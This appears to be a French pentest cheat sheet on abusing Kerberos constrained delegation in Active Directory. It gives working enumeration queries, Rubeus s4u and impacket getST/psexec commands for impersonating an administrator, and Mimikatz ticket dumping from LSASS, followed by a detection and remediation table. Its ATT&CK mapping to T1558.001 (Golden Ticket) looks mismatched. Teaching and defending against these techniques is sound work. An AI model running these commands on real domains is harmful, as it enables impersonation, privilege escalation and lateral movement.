La **Constrained Delegation** (délégation restreinte) a été introduite pour limiter les risques liés à l'_Unconstrained Delegation_. Au lieu de faire confiance à un serveur pour s'authentifier _n'importe où_ au nom de l'utilisateur, on restreint cette confiance à une liste spécifique de services (SPN).

Il existe deux variantes importantes :

1.  **Kerberos Only (sans transition de protocole)** : Le serveur ne peut déléguer que si l'utilisateur s'est initialement authentifié via Kerberos.
    
2.  **Any Authentication Protocol (avec transition de protocole)** : Le serveur peut déléguer même si l'utilisateur s'est authentifié via un autre protocole (NTLM, etc.). C'est cette variante qui est la plus intéressante pour un attaquant, car elle permet d'abuser de l'extension S4U2Self.
    

**Le mécanisme en jeu (S4U - Service for User) :**

-   **S4U2self (Transition de protocole)** : Permet à un service de demander un TGS pour _lui-même_ au nom d'un utilisateur arbitraire (sans connaître son mot de passe).
    
-   **S4U2proxy** : Permet à ce service d'utiliser le TGS obtenu via S4U2self ou un TGS forwardable d'un utilisateur pour demander un nouveau TGS vers un _autre_ service autorisé (la cible de la délégation).
## Détails de l'exploitation : S4U2self & S4U2proxy

L'exploitation de la délégation contrainte repose entièrement sur les extensions Kerberos S4U. Le scénario d'attaque dépend de la configuration de la délégation.

### Cas 1 : Délégation avec Transition de Protocole (TRUSTED_TO_AUTH_FOR_DELEGATION)

C'est le scénario le plus avantageux pour un attaquant. Si un compte de service est configuré pour la délégation avec "Any Authentication Protocol", cela signifie qu'il peut utiliser la **transition de protocole**. L'attaque se déroule en deux étapes (S4U2self puis S4U2proxy), entièrement gérées par les outils.

### Cas 2 : Délégation "Kerberos uniquement"

Si la délégation est configurée en "Kerberos only", le compte de service ne peut pas initier l'étape S4U2self pour un utilisateur arbitraire. Il ne peut que réaliser l'étape S4U2proxy. Cela signifie que pour que l'attaque fonctionne, un utilisateur (par exemple, un administrateur) doit **d'abord s'authentifier réellement via Kerberos** auprès du service compromis. Ce n'est qu'à ce moment-là que le service obtiendrait un ticket *forwardable* qu'un attaquant pourrait abuser. Ce scénario est donc beaucoup plus opportuniste.

## Énumération

### Cas 1 : Transition de Protocole

On cherche les comptes qui ont le flag `TRUSTED_TO_AUTH_FOR_DELEGATION`.

```powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Module ActiveDirectory
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo,samAccountName,userAccountControl | ?{($_.userAccountControl -band 0x1000000)}
```

### Cas 2 : Kerberos Uniquement

On cherche les comptes qui ont une valeur dans `msDS-AllowedToDelegateTo` mais **SANS** le flag `TRUSTED_TO_AUTH_FOR_DELEGATION`.

```powershell
# PowerView
Get-DomainUser -TrustedToDelegate
Get-DomainComputer -TrustedToDelegate

# Module ActiveDirectory
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo,samAccountName,userAccountControl | ?{!($_.userAccountControl -band 0x1000000)}
```

## Exploitation

### Exploitation du Cas 1 : Avec Transition de Protocole

C'est le cas le plus simple. On a compromis `svc_compromis` et on veut accéder à `cifs/serveur_cible` en tant qu'`administrateur`.

#### Avec Rubeus

La commande `s4u` de Rubeus effectue les deux étapes S4U2self et S4U2proxy.

```powershell
# /impersonateuser: l'utilisateur à usurper
# /msdsspn: le service cible autorisé pour la délégation
Rubeus.exe s4u /user:svc_compromis /password:LePassword /impersonateuser:administrateur /msdsspn:cifs/serveur_cible /altservice:cifs /ptt
```
La commande va directement injecter le ticket en mémoire (`/ptt`).

#### Avec Impacket

`getST.py` réalise également les deux étapes S4U2self et S4U2proxy.

```bash
# -impersonate: l'utilisateur à usurper
impacket-getST -spn cifs/serveur_cible -impersonate administrateur -dc-ip $ip_dc $domaine/svc_compromis:LePassword
export KRB5CCNAME=/path/to/administrateur.ccache
impacket-psexec -k -no-pass serveur_cible
```

### Exploitation du Cas 2 : Kerberos Uniquement

Ce scénario est plus complexe et opportuniste. On a compromis le serveur `SRV-DELEG` sur lequel tourne un service `svc_deleg` qui a une délégation contrainte "Kerberos only" vers `cifs/SRV-CIBLE`.

1.  **Attendre une connexion et intercepter le ticket**

    L'attaquant doit attendre qu'un utilisateur à haut privilège (ex: `admin_domain`) s'authentifie sur `SRV-DELEG` via Kerberos. Lorsque cela arrive, un ticket de service (TGS) pour `svc_deleg` au nom de `admin_domain` sera présent dans la mémoire de `SRV-DELEG`.

2.  **Dumper les tickets en mémoire**

    Avec des droits élevés sur `SRV-DELEG`, on peut utiliser Mimikatz pour extraire les tickets Kerberos de LSASS.

    ```powershell
    mimikatz # privilege::debug
    mimikatz # sekurlsa::tickets /export
    ```

    Cette commande exporte tous les tickets dans des fichiers `.kirbi`. L'attaquant doit trouver le bon ticket : celui du client `admin_domain` pour le service `svc_deleg@domaine.local`.

3.  **Utiliser le ticket pour S4U2proxy (Rubeus)**

    Une fois le ticket `[0;XXXXX]-2-XXXXX-admin_domain@svc_deleg@...kirbi` trouvé, on l'utilise avec Rubeus pour demander le ticket vers le service final. C'est l'étape S4U2proxy.

```powershell
# /tgs : Le ticket de service forwardable qu'on a dumpé
# /msdsspn : Le service cible final
 Rubeus.exe s4u /user:svc_deleg /password:Password /tgs:ticket_dumpé.kirbi /msdsspn:cifs/SRV-CIBLE /ptt
 ```

Rubeus utilise le ticket fourni pour demander un nouveau ticket au KDC pour le SPN `cifs/SRV-CIBLE` et l'injecte en mémoire. L'attaquant peut alors accéder à `SRV-CIBLE` en tant que `admin_domain`.

---

| Catégorie                    | Information                                                                                                                                                                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TTP**                      | T1558.001 (Steal or Forge Kerberos Tickets)                                                                                                                                                                                                                                            |
| **Description de l'attaque** | L'abus de la délégation contrainte permet à un attaquant de se faire passer pour un autre utilisateur. Avec la **transition de protocole**, il peut le faire pour n'importe qui. En **Kerberos only**, il doit d'abord intercepter un ticket d'une victime qui s'est authentifiée au service. |
| **Impacts potentiels**       | - Élévation de privilèges<br>- Mouvement latéral<br>- Accès non autorisé à des services critiques (serveurs de fichiers, bases de données, etc.)                                                                                                                                    |
| **Comment la détecter**      | - Surveiller les événements Kerberos (4769) pour des demandes de tickets S4U inhabituelles.<br>- Auditer les comptes avec `msDS-AllowedToDelegateTo` configuré.<br>- Détecter l'utilisation d'outils comme Rubeus ou Mimikatz (dump de tickets).                                        |
| **Remédiations/mitigations** | - Limiter au strict nécessaire les comptes autorisés à déléguer.<br>- Préférer la délégation "Kerberos only" ou la "Resource-Based Constrained Delegation".<br>- Placer les comptes sensibles (admins) dans le groupe "Protected Users".<br>- Activer l'option "Account is sensitive and cannot be delegated". |
| **Lien de référence**        | [MITRE ATT&CK - T1558.001](https://attack.mitre.org/techniques/T1558/001/)                                                                                                                                                                                                  |


